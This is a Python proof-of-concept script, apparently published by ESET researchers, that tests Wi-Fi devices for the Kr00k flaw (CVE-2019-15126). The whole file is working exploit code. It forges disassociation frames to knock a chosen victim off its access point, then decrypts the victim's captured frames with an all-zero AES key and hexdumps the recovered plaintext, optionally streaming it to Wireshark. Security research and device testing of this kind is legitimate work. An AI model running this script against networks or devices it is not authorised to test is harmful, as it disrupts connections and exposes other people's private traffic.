#!/usr/bin/env python
#
# Kr00k (CVE-2019-15126) testing script.
#
# For feedback or questions contact us at: github@eset.com
# https://github.com/eset/malware-research/
#
# Authors:
# Martin Kaluznik <martin.kaluznik@eset.com>
# Milos Cermak <milos.cermak@eset.com>
#
# This code is provided to the community under the two-clause BSD license as
# follows:
#
# Copyright (C) 2020 ESET
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this
# list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice,
# this list of conditions and the following disclaimer in the documentation
# and/or other materials provided with the distribution.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
# DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
# FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
# DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
# SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
# CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
# OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

import argparse
import re
import time

try:
    from Crypto.Cipher import AES
except:
    from Cryptodome.Cipher import AES

from functools import partial
from datetime import datetime, timedelta
from scapy.all import *

snap_header = b'\xAA\xAA\x03\x00\x00'

def write(msg, *args):
    prefix = datetime.strftime(datetime.now(), '%H:%M:%S.%f')
    prefix = '[%s] ' % prefix[:11]
    print(prefix + msg, *args)

# Ignore MIC calculations, we can be reasonably certain that when
# decrypted data start with SNAP header, they are decrypted correctly

# Initialize with zero key
cipher = AES.new(b'\x00' * 16, AES.MODE_ECB)

def decrypt_ccmp_zero(pkt):
    # Protected flag
    if (pkt[1] & 0x40) != 0x40:
        return None

    # Data frame
    if pkt[0] == 0x08:
        off_src = 0x10;
        off_iv = 0x18;
        off_data = 0x20;
    # QoS data frame
    elif pkt[0] == 0x88:
        off_src = 0x0A;
        off_iv = 0x1A;
        off_data = 0x22;
    else:
        return None

    dec_pkt = b''

    block_cnt = (len(pkt) - off_data + 15) // 16
    block_last = (len(pkt) - off_data) % 16

    X = bytearray(16)
    X[0]  = 0x01;
    X[1]  = 0x00;
    X[2]  = pkt[off_src + 0]
    X[3]  = pkt[off_src + 1]
    X[4]  = pkt[off_src + 2]
    X[5]  = pkt[off_src + 3]
    X[6]  = pkt[off_src + 4]
    X[7]  = pkt[off_src + 5]
    X[8]  = pkt[off_iv + 7]
    X[9]  = pkt[off_iv + 6]
    X[10] = pkt[off_iv + 4]
    X[11] = pkt[off_iv + 5]
    X[12] = pkt[off_iv + 1]
    X[13] = pkt[off_iv + 0]

    # AES.MODE_CCM with early exit if first block does not match
    for block_idx in range(1, block_cnt + 1):
        X[14] = (block_idx >> 8) & 0xFF
        X[15] = block_idx & 0xFF

        block_size = 16
        if block_last > 0 and block_idx == block_cnt:
            block_size = block_last;

        xor_key = cipher.encrypt(bytes(X))

        for byte_idx in range(block_size):
            dec_pkt += bytes([pkt[off_data + byte_idx] ^ xor_key[byte_idx]])

        off_data += block_size

        # Stop decrypting if first block header doesn't match
        if block_idx == 1:
            if not dec_pkt.startswith(snap_header):
                return None

    return dec_pkt

def handle_pkt(args, pkt):
    if args.interface is not None:
        # Try to get BSSID from ESSID (beacon frame)
        if args.bssid is None and args.essid is not None and pkt.haslayer(Dot11Beacon):
            if pkt.getlayer(Dot11Elt).info == args.essid.encode():
                args.bssid = pkt.getlayer(Dot11).addr2
                write('Got BSSID %s for network %s' % (args.bssid, args.essid))

        # Try to send disassociation packet to trigger the vulnerability
        if args.bssid is not None and args.victim is not None and args.disassoc_next <= datetime.now():
            # If we have not seen association request after last disassociation
            if args.disassoc_confirm + args.disassoc_miss != args.disassoc_attempts:
                args.disassoc_miss += 1

            if args.disassoc_attempts >= 20:
                if args.dec_pkts > 0:
                    write('Vulnerable, found %d zero encrypted packets' % args.dec_pkts)
                elif args.disassoc_confirm < args.disassoc_attempts // 2:
                    write('Seen too few (%d) association requests after %d disassociation attempts' % (args.disassoc_confirm, args.disassoc_attempts))
                    write('detection may be unreliable')
                else:
                    write('No zero encrypted packets seen, victim is likely not vulnerable')

                exit(0)

            write('Sending disassociation frame to victim (%s)' % args.victim)
            args.disassoc_next = datetime.now() + timedelta(seconds = 15)
            args.disassoc_attempts += 1

            pkt = Dot11(addr1 = args.bssid, addr2 = args.victim, addr3 = args.bssid, type = 0, subtype = 10, FCfield = 0, ID = 0x13A)/Dot11Disas(reason = 7)
            send(pkt, iface = args.interface, verbose = 0)

        # Check that disassociation packet was accepted
        if args.disassoc_confirm + args.disassoc_miss != args.disassoc_attempts:
            if pkt.haslayer(Dot11AssoReq):
                if pkt.getlayer(Dot11).addr2 == args.victim and pkt.getlayer(Dot11Elt).info != b'':
                    write('Victim (%s) reconnected to %s' % (args.victim, pkt.getlayer(Dot11Elt).info.decode()))
                    args.disassoc_confirm += 1
                    args.disassoc_next = datetime.now() + timedelta(seconds = 5)


    # Kr00k vulnerability testing
    dot11 = pkt.getlayer(Dot11)
    if dot11 is not None and (args.victim is None or args.victim in [dot11.addr1, dot11.addr2, dot11.addr3]):
        # Try to ccmp decrypt with zero key
        dec_pkt = decrypt_ccmp_zero(raw(pkt.getlayer(Dot11)))
        if dec_pkt is not None:
            write('[!] Device with MAC %s is vulnerable, successfully decrypted %d bytes:' % (pkt.getlayer(Dot11).addr2, len(dec_pkt)))
            hexdump(dec_pkt)
            args.dec_pkts += 1

            if args.wireshark is not None:
                # Replace SNAP header (first 6 bytes) with 3 dummy MAC addresses (AA:AA:AA:AA:AA:AA)
                # to make wireshark recognize ethernet packet
                args.wireshark.push(b'\xAA' * 12 + dec_pkt[6:])
                args.wireshark.f.flush()

        # Krook V2, protected flag set but data are not encrypted
        if dot11.FCfield & 0x40:
            # Skip 2 bytes if QoS
            start = 2 if dot11.subtype == 8 else 0
            # Ccmp parameters are not present (some MediaTek chips)
            start_no_ccmp_params = start
            # Ccmp parameters are present (some Qualcomm chips)
            start_with_ccmp_params = start + 8

            unencrypted_data = None
            if raw(dot11.payload)[start_no_ccmp_params:start_no_ccmp_params + 5] == snap_header:
                unencrypted_data = raw(dot11.payload)[start_no_ccmp_params:]
            elif raw(dot11.payload)[start_with_ccmp_params:start_with_ccmp_params + 5] == snap_header:
                unencrypted_data = raw(dot11.payload)[start_with_ccmp_params:]

            if unencrypted_data is not None:
                write('[!] Device with MAC %s is vulnerable to V2:' % dot11.addr2)
                hexdump(unencrypted_data)
                args.dec_pkts += 1

                if args.wireshark is not None:
                    # Remove protected flag and if present ccmp parameters
                    # to make wireshark correctly analyze the frame
                    dot11.FCfield &= ~0x40
                    new_payload = raw(dot11.payload)[:start] + unencrypted_data
                    dot11.remove_payload()
                    dot11.add_payload(new_payload)
                    args.wireshark.push(pkt)
                    args.wireshark.f.flush()


# Initialization, argument parsing and validation

def mac_addr(val):
    if re.match('[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$', val.lower()):
        return val.lower()

    raise argparse.ArgumentTypeError('%s is not a valid MAC address' % val)

def main():
    parser = argparse.ArgumentParser(description = 'Kr00k (CVE-2019-15126) testing script by ESET Research')

    group = parser.add_mutually_exclusive_group(required = True)
    group.add_argument('-i', '--interface', help = 'Wireless interface to use for live attack')
    group.add_argument('-f', '--file', help = 'PCAP file to use for offline analysis')

    parser.add_argument('-v', '--victim', help = 'MAC address of client (victim) to disassociate', type = mac_addr)
    parser.add_argument('-b', '--bssid', help = 'BSSID of AP victim is connected to', type = mac_addr)
    parser.add_argument('-e', '--essid', help = 'ESSID of AP victim is connected to (for auto-detection of BSSID)')

    args = parser.parse_args()
    args.disassoc_next = datetime.fromtimestamp(0)
    args.disassoc_attempts = 0
    args.disassoc_confirm = 0
    args.disassoc_miss = 0
    args.dec_pkts = 0

    # Show decrypted packets in wireshark if available
    try:
        args.wireshark = WiresharkSink()
        args.wireshark.start()
        time.sleep(1)
    except OSError:
        args.wireshark = None

    if args.interface is not None:
        if args.victim is None:
            write('WARNING: No victim MAC address (-v) specified, using passive monitoring mode')
        elif args.bssid is None and args.essid is None:
            write('WARNING: No BSSID (-b) or ESSID specified (-e), using passive monitoring mode')
        elif args.bssid is None:
            write('Waiting for beacon from network %s to detect BSSID' % args.essid)

    filter = """
    type data subtype data or
    type data subtype qos-data or
    type mgt subtype assoc-req or
    type mgt subtype beacon
    """

    if args.interface:
        sniff(iface = args.interface, store = 0, filter = filter, prn = partial(handle_pkt, args))
    else:
        sniff(offline = args.file, store = 0, prn = partial(handle_pkt, args))

if __name__ == '__main__':
    main()
